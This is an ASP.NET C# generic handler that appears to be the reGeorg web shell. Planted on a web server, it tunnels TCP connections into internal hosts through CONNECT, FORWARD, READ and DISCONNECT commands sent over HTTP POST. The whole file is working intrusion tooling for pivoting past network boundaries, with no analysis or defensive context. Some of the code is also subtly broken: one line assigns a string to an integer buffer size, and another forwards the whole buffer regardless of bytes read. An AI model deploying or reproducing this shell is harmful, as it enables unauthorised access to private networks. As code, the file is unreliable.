<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState
{
    
    public void ProcessRequest (HttpContext context) {
        try
        {
            if (context.Request.HttpMethod == "POST")
            {
                String cmd = context.Request.QueryString.Get("cmd").ToUpper();
                String socketID = context.Request.QueryString.Get("socketID");
                if (cmd == "CONNECT")
                {
                    try
                    {
                        String target = context.Request.QueryString.Get("target").ToUpper();
                        int port = int.Parse(context.Request.QueryString.Get("port"));
                        IPAddress ip = IPAddress.Parse(target);
                        System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                        Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        
                        sender.Connect(remoteEP);
                        sender.Blocking = false;                    
                        if (socketID == null)
                            context.Session.Add("socket", sender);
                        else
                            context.Session.Add(socketID+"socket", sender);
                        context.Response.AddHeader("X-STATUS", "OK");
                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("X-ERROR", ex.Message);
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                }
                else if (cmd == "DISCONNECT")
                {
                    Socket s;
                    if (socketID == null)
                    {
                        s = (Socket)context.Session["socket"];
                        context.Session.Abandon();
                    } else {
                        s = (Socket)context.Session[socketID+"socket"];
                        context.Session[socketID+"socket"] = null;
                    }
                    try
                    {
                        s.Close();
                    }
                    catch (Exception ex)
                    {

                    }
                    context.Response.AddHeader("X-STATUS", "OK");
                }
                else if (cmd == "FORWARD")
                {
                    Socket s;
                    if (socketID == null)
                        s = (Socket)context.Session["socket"];
                    else
                        s = (Socket)context.Session[socketID+"socket"];
                    try
                    {
                        int buffLen = context.Request.ContentLength;
                        byte[] buff = new byte[buffLen];
                        int c = 0;
                        while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                        {
                            s.Send(buff);
                        }
                        context.Response.AddHeader("X-STATUS", "OK");
                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("X-ERROR", ex.Message);
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                }
                else if (cmd == "READ")
                {
                    Socket s;
                    if (socketID == null)
                        s = (Socket)context.Session["socket"];
                    else
                        s = (Socket)context.Session[socketID+"socket"];
                    try
                    {
                        int c = 0;
                        int bufSize = context.Request.QueryString.Get("bufsize").ToUpper();
                        byte[] readBuff = new byte[bufSize];
                        try
                        {
                            while ((c = s.Receive(readBuff)) > 0)
                            {
                                byte[] newBuff = new byte[c];
                                Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                                context.Response.BinaryWrite(newBuff);
                            }
                            context.Response.AddHeader("X-STATUS", "OK");
                        }
                        catch (SocketException soex)
                        {
                            context.Response.AddHeader("X-STATUS", "OK");
                            return;
                        }

                    }
                    catch (Exception ex)
                    {
                        context.Response.AddHeader("X-ERROR", ex.Message);
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                }
            } else {
                context.Response.Write("Georg says, 'All seems fine'");
            }
        }
        catch (Exception exKak)
        {
            context.Response.AddHeader("X-ERROR", exKak.Message);
            context.Response.AddHeader("X-STATUS", "FAIL");
        }
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

}
